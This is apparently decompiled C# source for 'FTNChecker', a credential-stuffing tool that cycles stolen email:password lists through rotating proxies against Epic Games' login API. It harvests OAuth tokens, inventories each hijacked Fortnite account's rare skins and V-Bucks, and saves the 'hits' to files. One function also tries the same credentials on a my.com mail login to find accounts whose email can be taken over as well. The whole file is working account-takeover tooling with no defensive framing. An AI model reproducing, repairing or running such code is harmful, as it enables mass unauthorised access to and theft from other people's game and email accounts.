using System;
using System.Collections;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using Colorful;
using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace FTNChecker
{
	// Token: 0x02000002 RID: 2
	internal class Check
	{
		// Token: 0x17000001 RID: 1
		// (get) Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		// (set) Token: 0x06000002 RID: 2 RVA: 0x00002057 File Offset: 0x00000257
		public static object Skins { get; private set; }

		// Token: 0x06000003 RID: 3 RVA: 0x00002060 File Offset: 0x00000260
		public static void UpdateTitle()
		{
			for (;;)
			{
				Colorful.Console.Clear();
				Colorful.Console.WriteLine(string.Concat(new string[]

				{
					"[",
					Vars.check.ToString(),
					"/",
					Vars.total.ToString(),
					"] Checked Accounts"
				}), Color.Cyan);
				Colorful.Console.WriteLine(string.Concat(new string[]
				{
					"[",
                    Vars.hits.ToString(),
					"/",
                    Vars.check.ToString(),
					"] Good Accounts"
				}), Color.LawnGreen);
				Colorful.Console.WriteLine(string.Concat(new string[]
				{
					"[",
                    Vars.bad.ToString(),
					"/",
                    Vars.check.ToString(),
					"] Bad Accounts"
				}), Color.Red);
				Colorful.Console.WriteLine("[" + (Vars.CPM * 60).ToString() + "] CPM", Color.Magenta);
                Colorful.Console.WriteLine("[" + Vars.err.ToString() + "] Proxy Errors", Color.Yellow);
                Colorful.Console.WriteLine(string.Concat(new string[]
{
                    "[",
                    Vars.Skinned.ToString(),
                    "/",
                    Vars.check.ToString(),
                    "] Skinned Accounts"
}), Color.Red);

                Thread.Sleep(1000);
			}
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002120 File Offset: 0x00000320
		public static void CallWorker()
		{
			for (;;)
			{
				bool flag = Vars.proxyindex > Vars.proxies.Count<string>() - 2;
				bool flag74 = flag;
				if (flag74)
				{
					Vars.proxyindex = 0;
				}
				Interlocked.Increment(ref Vars.proxyindex);
				using (HttpRequest httpRequest = new HttpRequest())
				{
					bool flag2 = Vars.accindex >= Vars.accounts.Count<string>();
					bool flag75 = flag2;
					if (flag75)
					{
						Vars.stop++;
						break;
					}
					string[] array = Vars.accounts[Vars.accindex].Split(new char[]
					{
						':',
						';',
						'|'
					});
					string text = array[0] + ":" + array[1];
					Interlocked.Increment(ref Vars.accindex);
					try
					{
						httpRequest.KeepAlive = true;
						httpRequest.IgnoreProtocolErrors = true;
						httpRequest.ConnectTimeout = 5000;
						httpRequest.AllowAutoRedirect = false;
						httpRequest.AddHeader("Accept", "application/json");
						httpRequest.UserAgent = "Fortnite/++Fortnite+Release-4.5-CL-4166199 Windows/6.2.9200.1.768.64bit";
						httpRequest.AddHeader("Authorization", "basic MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE=");
						bool flag3 = !Vars.isRunningProxyless;
						bool flag76 = flag3;
						if (flag76)
						{
							bool flag4 = Vars.proxytype == "HTTP";
							bool flag77 = flag4;
							if (flag77)
							{
								httpRequest.Proxy = HttpProxyClient.Parse(Vars.proxies[Vars.proxyindex]);
							}
							bool flag5 = Vars.proxytype == "SOCKS4";
							bool flag78 = flag5;
							if (flag78)
							{
								httpRequest.Proxy = Socks4ProxyClient.Parse(Vars.proxies[Vars.proxyindex]);
							}
							bool flag6 = Vars.proxytype == "SOCKS5";
							bool flag79 = flag6;
							if (flag79)
							{
								httpRequest.Proxy = Socks5ProxyClient.Parse(Vars.proxies[Vars.proxyindex]);
							}
							httpRequest.Proxy.ConnectTimeout = 5000;
						}
						HttpResponse httpResponse = httpRequest.Get("https://www.epicgames.com/id/api/csrf", null);
						CookieCollection cookies = httpResponse.Cookies.GetCookies("https://www.epicgames.com/id/api/csrf");
						try
						{
							httpRequest.AddHeader("x-xsrf-token", cookies["XSRF-TOKEN"].Value);
						}
						catch
						{
						}
						HttpResponse httpResponse2 = httpRequest.Post("https://www.epicgames.com/id/api/login", string.Concat(new string[]
						{
							"email=",
							WebUtility.UrlEncode(array[0]),
							"&password=",
							WebUtility.UrlEncode(array[1]),
							"&rememberMe=true"
						}), "application/x-www-form-urlencoded");
						bool flag7 = httpResponse2.ToString().Contains("Sorry the credentials you are using are invalid");
						bool flag80 = flag7;
						if (flag80)
						{
							Interlocked.Increment(ref Vars.bad);
							Vars.CPS++;
							Vars.check++;
						}
						else
						{
							bool flag8 = httpResponse2.ToString().Contains("Sorry the account credentials you are using are invalid") || httpResponse2.ToString().Contains("Real ID association is required") || httpResponse2.ToString().Contains("Please reset your password to proceed with login");
							bool flag81 = flag8;
							if (flag81)
							{
								Interlocked.Increment(ref Vars.bad);
								Vars.CPS++;
								Vars.check++;
							}
							else
							{
								bool flag9 = httpResponse2.ToString().Contains("errors.com.epicgames.common.throttled") || httpResponse2.ToString().Contains("Process exited before completing");
								bool flag82 = flag9;
								if (flag82)
								{
									Vars.accounts.Add(text);
								}
								else
								{
									bool flag10 = httpResponse2.ToString().Contains("account has been locked because of too many invalid login attempts") || httpResponse2.ToString().Contains("Sorry the account you are using is not active");
									bool flag83 = flag10;
									if (flag83)
									{
										Interlocked.Increment(ref Vars.bad);
										Vars.CPS++;
										Vars.check++;
									}
									else
									{
										bool flag11 = httpResponse2.ToString().Contains("Two-Factor authentication required to process");
										bool flag84 = flag11;
										if (flag84)
										{
											Interlocked.Increment(ref Vars.bad);
											Vars.CPS++;
											Vars.check++;
											break;
										}
										bool flag12 = httpResponse2.ToString() == "";
										bool flag85 = flag12;
										if (flag85)
										{
											string text2 = httpRequest.Get("https://www.epicgames.com/id/api/exchange", null).ToString();
											bool flag13 = text2.Contains("You are not authenticated. Please authenticate.");
											bool flag86 = flag13;
											if (flag86)
											{
												Vars.accounts.Add(text);
											}
											else
											{
												Json json = JsonConvert.DeserializeObject<Json>(text2);
												httpRequest.ClearAllHeaders();
												httpRequest.AddHeader("Authorization", "basic MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE=");
												string text3 = httpRequest.Post("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token", string.Concat(new string[]
												{
													"grant_type=exchange_code&exchange_code=",
													json.exchangecode,
													"&includePerms=true&token_type=eg1"
												}), "application/x-www-form-urlencoded").ToString();
												bool flag14 = text3.Contains("access_token");
												bool flag87 = flag14;
												if (flag87)
												{
													Json json2 = JsonConvert.DeserializeObject<Json>(text3);
													string access_token = json2.access_token;
													string account_id = json2.account_id;
													httpRequest.AddHeader("Authorization", "bearer " + access_token);
													string text4 = httpRequest.Post(string.Format("https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{0}/client/QueryProfile?profileId=athena&rvn=-1", account_id), "{}", "application/json").ToString();
													bool flag15 = !text4.Contains("errors.com.epicgames.common.missing_action");
													bool flag16 = flag15;
													bool flag88 = flag16;
													if (flag88)
													{
														string username = "Unknown";
														string created = "Unknown";
														int num = 0;
														JObject jobject = JObject.Parse(text4);
														string text5 = jobject.ToString();
														created = jobject["profileChanges"][0]["profile"]["created"].ToString();
														List<string> list = new List<string>();
														List<string> list2 = new List<string>();
														List<string> list3 = new List<string>();
														List<string> list4 = new List<string>();
														List<string> list5 = new List<string>();
														foreach (object obj in FTNIDS.Skins)
														{
															DictionaryEntry dictionaryEntry = (DictionaryEntry)obj;
															bool flag17 = text4.Contains(dictionaryEntry.Key.ToString());
															bool flag18 = flag17;
															bool flag89 = flag18;
															if (flag89)
															{
																list.Add("-> " + dictionaryEntry.Value.ToString());
															}
														}
														foreach (object obj2 in FTNIDS.Backblings)
														{
															DictionaryEntry dictionaryEntry2 = (DictionaryEntry)obj2;
															bool flag19 = text4.Contains(dictionaryEntry2.Key.ToString());
															bool flag20 = flag19;
															bool flag90 = flag20;
															if (flag90)
															{
																list2.Add("-> " + dictionaryEntry2.Value.ToString());
															}
														}
														foreach (object obj3 in FTNIDS.Pickaxes)
														{
															DictionaryEntry dictionaryEntry3 = (DictionaryEntry)obj3;
															bool flag21 = text4.Contains(dictionaryEntry3.Key.ToString());
															bool flag22 = flag21;
															bool flag91 = flag22;
															if (flag91)
															{
																list3.Add("-> " + dictionaryEntry3.Value.ToString());
															}
														}
														foreach (object obj4 in FTNIDS.Gliders)
														{
															DictionaryEntry dictionaryEntry4 = (DictionaryEntry)obj4;
															bool flag23 = text4.Contains(dictionaryEntry4.Key.ToString());
															bool flag24 = flag23;
															bool flag92 = flag24;
															if (flag92)
															{
																list4.Add("-> " + dictionaryEntry4.Value.ToString());
															}
														}
														foreach (string value in UserData.Rares)
														{
															bool flag25 = text4.Contains(value);
															bool flag26 = flag25;
															bool flag93 = flag26;
															if (flag93)
															{
																Check.SaveToDisk("UserRares", text);
																Colorful.Console.Write("[R]", Color.Magenta);
															}
														}
														foreach (string value2 in Vars.RareSkins)
														{
															bool flag27 = text4.Contains(value2);
															bool flag94 = flag27;
															if (flag94)
															{
																File.AppendAllText("Results/" + Vars.ResultsFolder + "/rares.txt", text + Environment.NewLine);
																Vars.Rares++;
																break;
															}
														}
														bool flag28 = text4.Contains("CID_017_Athena_Commando_M".ToLower());
														bool flag29 = flag28;
														bool flag95 = flag29;
														if (flag95)
														{
															Check.SaveToDisk("Aerial Assault Trooper", text);
															list5.Add("-> Aerial Assault Trooper");
														}
														bool flag30 = text4.Contains("CID_022_Athena_Commando_F".ToLower());
														bool flag31 = flag30;
														bool flag96 = flag31;
														if (flag96)
														{
															Check.SaveToDisk("Recon Expert", text);
															list5.Add("-> Recon Expert");
														}
														bool flag32 = text4.Contains("CID_028_Athena_Commando_F".ToLower());
														bool flag33 = flag32;
														bool flag97 = flag33;
														if (flag97)
														{
															Check.SaveToDisk("Renegade Raider", text);
															list5.Add("-> Renegade Raider");
														}
														bool flag34 = text4.Contains("CID_029_Athena_Commando_F_Halloween".ToLower());
														bool flag35 = flag34;
														bool flag98 = flag35;
														if (flag98)
														{
															Check.SaveToDisk("Ghoul Trooper", text);
															list5.Add("-> Ghoul Trooper");
														}
														bool flag36 = text4.Contains("CID_035_Athena_Commando_M_Medieval".ToLower());
														bool flag37 = flag36;
														bool flag99 = flag37;
														if (flag99)
														{
															Check.SaveToDisk("Black Knight", text);
															list5.Add("-> Black Knight");
														}
														bool flag38 = text4.Contains("CID_039_Athena_Commando_F_Disco".ToLower());
														bool flag39 = flag38;
														bool flag100 = flag39;
														if (flag100)
														{
															Check.SaveToDisk("Sparkle Specialist", text);
															list5.Add("-> Sparkle Specialist");
														}
														bool flag40 = text4.Contains("CID_051_Athena_Commando_M_HolidayElf".ToLower());
														bool flag41 = flag40;
														bool flag101 = flag41;
														if (flag101)
														{
															Check.SaveToDisk("Codename ELF", text);
															list5.Add("-> Codename E.L.F.");
														}
														bool flag42 = text4.Contains("CID_175_Athena_Commando_M_Celestial".ToLower());
														bool flag43 = flag42;
														bool flag102 = flag43;
														if (flag102)
														{
															Check.SaveToDisk("Galaxy", text);
															list5.Add("-> Galaxy");
														}
														bool flag44 = text4.Contains("CID_259_Athena_Commando_M_StreetOps".ToLower());
														bool flag45 = flag44;
														bool flag103 = flag45;
														if (flag103)
														{
															Check.SaveToDisk("Reflex", text);
															list5.Add("-> Reflex");
														}
														bool flag46 = text4.Contains("CID_313_Athena_Commando_M_KpopFashion".ToLower());
														bool flag47 = flag46;
														bool flag104 = flag47;
														if (flag104)
														{
															Check.SaveToDisk("IKONIK", text);
															list5.Add("-> IKONIK");
														}
														bool flag48 = text4.Contains("CID_174_Athena_Commando_F_CarbideWhite".ToLower());
														bool flag49 = flag48;
														bool flag105 = flag49;
														if (flag105)
														{
															Check.SaveToDisk("Eon", text);
															list5.Add("-> Eon");
														}
														bool flag50 = text4.Contains("CID_434_Athena_Commando_F_StealthHonor".ToLower());
														bool flag51 = flag50;
														bool flag106 = flag51;
														if (flag106)
														{
															Check.SaveToDisk("Wonder", text);
															list5.Add("-> Wonder");
														}
														bool flag52 = text4.Contains("CID_342_Athena_Commando_M_StreetRacerMetallic".ToLower());
														bool flag53 = flag52;
														bool flag107 = flag53;
														if (flag107)
														{
															Check.SaveToDisk("Honor Guard", text);
															list5.Add("-> Honor Guard");
														}
														bool flag54 = text4.Contains("Glider_ID_001".ToLower());
														bool flag55 = flag54;
														bool flag108 = flag55;
														if (flag108)
														{
															Check.SaveToDisk("Aerial Assault One", text);
															list5.Add("-> Aerial Assault One");
														}
														bool flag56 = text4.Contains("Pickaxe_Lockjaw".ToLower());
														bool flag57 = flag56;
														bool flag109 = flag57;
														if (flag109)
														{
															Check.SaveToDisk("Raider's Revenge", text);
															list5.Add("-> Raider's Revenge");
														}
														bool flag58 = text4.Contains("Glider_Warthog".ToLower());
														bool flag59 = flag58;
														bool flag110 = flag59;
														if (flag110)
														{
															Check.SaveToDisk("Mako", text);
															list5.Add("-> Mako");
														}
														bool flag60 = text4.Contains("CID_030_Athena_Commando_M_Halloween".ToLower());
														bool flag111 = flag60;
														if (flag111)
														{
															try
															{
																foreach (JToken jtoken in JObject.Parse(text4)["profileChanges"][0]["profile"]["items"].Children())
																{
																	bool flag61 = jtoken.First["templateId"].ToString() == "AthenaCharacter:cid_030_athena_commando_m_halloween" && jtoken.First["attributes"].ToString().Contains("Mat1");
																	bool flag62 = flag61;
																	bool flag112 = flag62;
																	if (flag112)
																	{
																		list5.Add("-> OG Skull Trooper");
																		Check.SaveToDisk("OG Skull Trooper", text);
																		Vars.OG_SKULL++;
																		Vars.Rares++;
																	}
																}
															}
															catch
															{
															}
														}
														httpRequest.ClearAllHeaders();
														httpRequest.AddHeader("Accept", "*/*");
														httpRequest.AddHeader("Authorization", "bearer " + access_token);
														string json3 = httpRequest.Post("https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/" + account_id + "/client/QueryProfile?profileId=common_core&rvn=-1", "{\"{   }\":\"\"}", "application/json").ToString();
														JObject jobject2 = JObject.Parse(json3);
														string[] array2 = jobject2["profileChanges"][0]["profile"]["items"].ToString().Split(new string[]
														{
															"\r\n"
														}, StringSplitOptions.None);
														for (int i = 0; i < array2.Length; i++)
														{
															bool flag63 = array2[i].Contains("Currency:MtxGiveaway");
															bool flag113 = flag63;
															if (flag113)
															{
																string text6 = array2[i + 4];
																num = int.Parse(text6.Split(new char[]
																{
																	':'
																})[1]);
																break;
															}
														}
														bool flag64 = num != 0;
														bool flag114 = flag64;
														if (flag114)
														{
															bool flag65 = num >= 2500;
															bool flag115 = flag65;
															if (flag115)
															{
																Check.SaveToDiskVbucks("2500+", text, num);
															}
															else
															{
																bool flag66 = num >= 2000;
																bool flag116 = flag66;
																if (flag116)
																{
																	Check.SaveToDiskVbucks("2000+", text, num);
																}
																else
																{
																	bool flag67 = num >= 1000;
																	bool flag117 = flag67;
																	if (flag117)
																	{
																		Check.SaveToDiskVbucks("1000+", text, num);
																	}
																	else
																	{
																		bool flag68 = num >= 500;
																		bool flag118 = flag68;
																		if (flag118)
																		{
																			Check.SaveToDiskVbucks("500+", text, num);
																		}
																		else
																		{
																			bool flag69 = num >= 100;
																			bool flag119 = flag69;
																			if (flag119)
																			{
																				Check.SaveToDiskVbucks("100+", text, num);
																			}
																		}
																	}
																}
															}
															bool flag70 = num >= UserData.LogVbucksAmount;
															bool flag120 = flag70;
															if (flag120)
															{
																Check.SaveToDiskVbucks("UserAmount", text, num);
															}
														}
														bool flag71 = list.Count != 0;
														bool flag121 = flag71;
														if (flag121)
														{
															Check.Capture(text4);
															Check.AppenAllText("Results/" + Vars.ResultsFolder + "/Skinned.txt", text + Environment.NewLine);
															SaveCapture.WriteToDisk(text, account_id, created, username, Check.isFA(text), num, list, list2, list3, list4, list5);
															bool flag72 = list.Count >= UserData.LogSkinsAmount;
															bool flag73 = flag72;
															bool flag122 = flag73;
															if (flag122)
															{
																Check.SaveToDisk("UserAmount", text);
															}
															Vars.Skinned++;
														}
														else
														{
															Check.AppenAllText("Results/" + Vars.ResultsFolder + "/No-Skins.txt", text + Environment.NewLine);
															Vars.NoSkins++;
														}
													}
													Check.AppenAllText("Results/" + Vars.ResultsFolder + "/All-Hits.txt", text + Environment.NewLine);
													Vars.hits++;
													Vars.check++;
													Vars.CPS++;
												}
											}
										}
										else
										{
											Vars.accounts.Add(text);
										}
									}
								}
							}
						}
					}
					catch (Exception ex)
					{
						Vars.accounts.Add(text);
						Interlocked.Increment(ref Vars.err);
					}
				}
			}
		}

		// Token: 0x06000005 RID: 5 RVA: 0x000033E8 File Offset: 0x000015E8
		private static void AppenAllText(string filepath, string content)
		{
			using (FileStream fileStream = new FileStream(filepath, FileMode.Append, FileAccess.Write, FileShare.Read))
			{
				using (StreamWriter streamWriter = new StreamWriter(fileStream, Encoding.Unicode))
				{
					streamWriter.Write(content.ToString());
					streamWriter.Close();
					fileStream.Close();
				}
			}
		}

		// Token: 0x06000006 RID: 6 RVA: 0x00003464 File Offset: 0x00001664
		private static void Capture(string content)
		{
			bool flag = content.Contains("CID_175_Athena_Commando_M_Celestial".ToLower());
			bool flag2 = flag;
			bool flag37 = flag2;
			if (flag37)
			{
				Vars.Galaxy++;
			}
			bool flag3 = content.Contains("CID_313_Athena_Commando_M_KpopFashion".ToLower());
			bool flag4 = flag3;
			bool flag38 = flag4;
			if (flag38)
			{
				Vars.IKONIK++;
			}
			bool flag5 = content.Contains("CID_174_Athena_Commando_F_CarbideWhite".ToLower());
			bool flag6 = flag5;
			bool flag39 = flag6;
			if (flag39)
			{
				Vars.Eon++;
			}
			bool flag7 = content.Contains("CID_113_Athena_Commando_M_BlueAce".ToLower());
			bool flag8 = flag7;
			bool flag40 = flag8;
			if (flag40)
			{
				Vars.Rb++;
			}
			bool flag9 = content.Contains("CID_259_Athena_Commando_M_StreetOps".ToLower());
			bool flag10 = flag9;
			bool flag41 = flag10;
			if (flag41)
			{
				Vars.Reflex++;
			}
			bool flag11 = content.Contains("CID_342_Athena_Commando_M_StreetRacerMetallic".ToLower());
			bool flag12 = flag11;
			bool flag42 = flag12;
			if (flag42)
			{
				Vars.Honor++;
			}
			bool flag13 = content.Contains("CID_434_Athena_Commando_F_StealthHonor".ToLower());
			bool flag14 = flag13;
			bool flag43 = flag14;
			if (flag43)
			{
				Vars.Wonder++;
			}
			bool flag15 = content.Contains("CID_035_Athena_Commando_M_Medieval".ToLower());
			bool flag16 = flag15;
			bool flag44 = flag16;
			if (flag44)
			{
				Vars.BK++;
			}
			bool flag17 = content.Contains("CID_039_Athena_Commando_F_Disco".ToLower());
			bool flag18 = flag17;
			bool flag45 = flag18;
			if (flag45)
			{
				Vars.SS++;
			}
			bool flag19 = content.Contains("CID_051_Athena_Commando_M_HolidayElf".ToLower());
			bool flag20 = flag19;
			bool flag46 = flag20;
			if (flag46)
			{
				Vars.CodeName++;
			}
			bool flag21 = content.Contains("CID_226_Athena_Commando_F_Octoberfest".ToLower());
			bool flag22 = flag21;
			bool flag47 = flag22;
			if (flag47)
			{
				Vars.Heidi++;
			}
			bool flag23 = content.Contains("Glider_Warthog".ToLower());
			bool flag24 = flag23;
			bool flag48 = flag24;
			if (flag48)
			{
				Vars.Mako++;
			}
			bool flag25 = content.Contains("Glider_ID_001".ToLower());
			bool flag26 = flag25;
			bool flag49 = flag26;
			if (flag49)
			{
				Vars.AA1++;
			}
			bool flag27 = content.Contains("CID_022_Athena_Commando_F".ToLower());
			bool flag28 = flag27;
			bool flag50 = flag28;
			if (flag50)
			{
				Vars.RE++;
			}
			bool flag29 = content.Contains("CID_028_Athena_Commando_F".ToLower());
			bool flag30 = flag29;
			bool flag51 = flag30;
			if (flag51)
			{
				Vars.RR++;
			}
			bool flag31 = content.Contains("CID_029_Athena_Commando_F_Halloween".ToLower());
			bool flag32 = flag31;
			bool flag52 = flag32;
			if (flag52)
			{
				Vars.GT++;
			}
			bool flag33 = content.Contains("CID_017_Athena_Commando_M".ToLower());
			bool flag34 = flag33;
			bool flag53 = flag34;
			if (flag53)
			{
				Vars.Aerial++;
			}
			bool flag35 = content.Contains("Pickaxe_Lockjaw".ToLower());
			bool flag36 = flag35;
			bool flag54 = flag36;
			if (flag54)
			{
				Vars.RR_AXE++;
			}
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00003784 File Offset: 0x00001984
		private static void SaveToDisk(string filename, string combo)
		{
			bool flag = !Directory.Exists("Results/" + Vars.ResultsFolder + "/Rares");
			bool flag2 = flag;
			if (flag2)
			{
				Directory.CreateDirectory("Results/" + Vars.ResultsFolder + "/Rares");
			}
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Vars.ResultsFolder,
				"/Rares/",
				filename,
				".txt"
			}), combo + Environment.NewLine);
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00003810 File Offset: 0x00001A10
		private static void SaveToDiskVbucks(string filename, string combo, int VBucks)
		{
			bool flag = !Directory.Exists("Results/" + Vars.ResultsFolder + "/V-Bucks");
			bool flag2 = flag;
			if (flag2)
			{
				Directory.CreateDirectory("Results/" + Vars.ResultsFolder + "/V-Bucks");
			}
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Vars.ResultsFolder,
				"/V-Bucks/",
				filename,
				".txt"
			}), string.Format("{0} - {1} V-Bucks", combo, VBucks) + Environment.NewLine);
		}

		// Token: 0x06000009 RID: 9 RVA: 0x000038AC File Offset: 0x00001AAC
		private static string isFA(string combo)
		{
			string result;
			using (HttpRequest httpRequest = new HttpRequest())
			{
				try
				{
					httpRequest.Proxy = null;
					httpRequest.KeepAlive = true;
					httpRequest.IgnoreProtocolErrors = true;
					httpRequest.AllowAutoRedirect = false;
					string text = httpRequest.Get(string.Concat(new string[]
					{
						"https://aj-https.my.com/cgi-bin/auth?Login=",
						combo.Split(new char[]
						{
							':',
							';',
							'|'
						})[0].ToString().Replace(" ", ""),
						combo.Split(new char[]
						{
							':',
							';',
							'|'
						})[1].ToString().Replace(" ", ""),
						"&reqmode=fg&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS%C2%A4t=MyCom&mmp=mail&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS%C2%A4t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=fr_FR&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad"
					}), null).ToString();
					bool flag = text.Contains("Ok=1");
					bool flag2 = flag;
					bool flag5 = flag2;
					if (flag5)
					{
						File.AppendAllText("Results/" + Vars.ResultsFolder + "/FA.txt", combo + Environment.NewLine);
						result = "True";
					}
					else
					{
						bool flag3 = text.Contains("Ok=0");
						bool flag4 = flag3;
						bool flag6 = flag4;
						if (flag6)
						{
							result = "False";
						}
						else
						{
							result = "Unknown";
						}
					}
				}
				catch (Exception)
				{
					result = "Unknown";
				}
			}
			return result;
		}
	}
}
